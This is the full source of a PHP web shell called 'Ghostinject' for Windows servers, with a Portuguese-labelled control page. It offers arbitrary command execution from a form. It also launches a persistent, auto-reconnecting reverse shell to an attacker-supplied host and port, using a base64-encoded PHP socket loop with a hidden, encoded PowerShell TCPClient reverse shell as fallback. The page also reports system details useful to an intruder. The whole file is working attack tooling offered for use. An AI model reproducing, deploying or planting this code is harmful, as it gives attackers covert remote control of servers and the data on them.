<?php
// Ghostinject - Windows PHP persistent reverse shell (no extras)
error_reporting(0);

function execute_cmd($cmd) {
    if (stripos($cmd, 'cmd /c') !== 0 && stripos($cmd, 'cmd.exe') === false)
        $cmd = 'cmd /c ' . $cmd;
    $out = @shell_exec($cmd . " 2>&1");
    if ($out === null || $out === '') {
        $out = @exec($cmd . " 2>&1", $arr);
        $out = implode("\n", $arr);
    }
    return $out ?: "[no output]";
}

if (isset($_POST['cmd'])) {
    echo "<pre>" . htmlspecialchars(execute_cmd($_POST['cmd'])) . "</pre>";
    exit;
}

if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
    $host = $_POST['rev_host'];
    $port = (int)$_POST['rev_port'];
    $success = false;

    // Persistent PHP socket (auto-reconnect, no socket_set_option)
    if (function_exists('fsockopen')) {
        $payload = base64_encode(
            'set_time_limit(0);$h="' . $host . '";$p=' . $port . ';while(1){' .
            '$s=@fsockopen($h,$p,$e,$e,30);if($s){' .
            'stream_set_timeout($s,120);' .
            'while(!feof($s)){$c=fgets($s);if($c===false)break;' .
            '$o=shell_exec($c);fwrite($s,$o===null?"[error]\\n":$o);}' .
            'fclose($s);}sleep(10);}'
        );
        // Find php.exe
        $php_path = 'php';
        $try_paths = ['C:\\xampp\\php\\php.exe', 'C:\\php\\php.exe', 'C:\\PHP\\php.exe', 'php.exe'];
        foreach ($try_paths as $p) {
            if (file_exists($p)) { $php_path = $p; break; }
        }
        // Use exec (not popen) which worked before
        $cmd = "start /b $php_path -r \"eval(base64_decode('$payload'));\" > NUL 2>&1";
        @exec($cmd);
        $success = true;
    }

    // Fallback PowerShell
    if (!$success) {
        $ps_payload = '$c=New-Object Net.Sockets.TCPClient("' . $host . '",' . $port . ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()}$c.Close()';
        $enc = base64_encode($ps_payload);
        $ps_exec = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $enc";
        @exec("start /b $ps_exec > NUL 2>&1");
        $success = true;
    }

    echo $success ? "Ghostinject: Persistent reverse shell started (auto-reconnect every 10s). Keep listener open!" : "Failed.";
    exit;
}

// System info
$os = php_uname() ?: 'Windows';
$user = get_current_user() ?: (function_exists('exec') ? exec('whoami') : 'N/A');
$cwd = getcwd() ?: 'N/A';
$phpver = phpversion();
$serv = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (php_sapi_name() == 'cli' ? 'CLI' : 'Apache/IIS');
$disabled = ini_get('disable_functions') ?: 'none';
?>
<!DOCTYPE html>
<html>
<head><title>Ghostinject | Windows PHP</title>
<style>body{background:#0a0f0a;color:#0f0;font-family:monospace;padding:2em;} input,button{background:#222;color:#0f0;border:1px solid #0f0;} button{cursor:pointer;}</style>
</head>
<body>
<h2>👻 Ghostinject - Windows PHP (Persistent & Stable)</h2>
<ul>
<li>Sistema: <?=htmlspecialchars($os)?></li>
<li>Usuário: <?=htmlspecialchars($user)?></li>
<li>Diretório: <?=htmlspecialchars($cwd)?></li>
<li>PHP: <?=htmlspecialchars($phpver)?></li>
<li>Servidor: <?=htmlspecialchars($serv)?></li>
<li>disable_functions: <?=htmlspecialchars($disabled)?></li>
</ul>

<h3>💻 Command</h3>
<form method="post" id="cmdForm">
<input type="text" name="cmd" placeholder="ex: whoami" size="70">
<button type="submit">Run</button>
</form>
<div id="cmdResult"></div>

<h3>🔌 Persistent Reverse Shell (auto-reconnect)</h3>
<form method="post">
<input type="text" name="rev_host" placeholder="Your IP" required><br>
<input type="text" name="rev_port" placeholder="Port" required><br>
<button type="submit">🚀 Start Ghostinject (persistent)</button>
</form>

<script>
const form = document.getElementById('cmdForm');
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    let fd = new FormData(form);
    let res = await fetch('', { method:'POST', body: fd });
    let txt = await res.text();
    document.getElementById('cmdResult').innerHTML = txt;
});
</script>
</body>
</html>
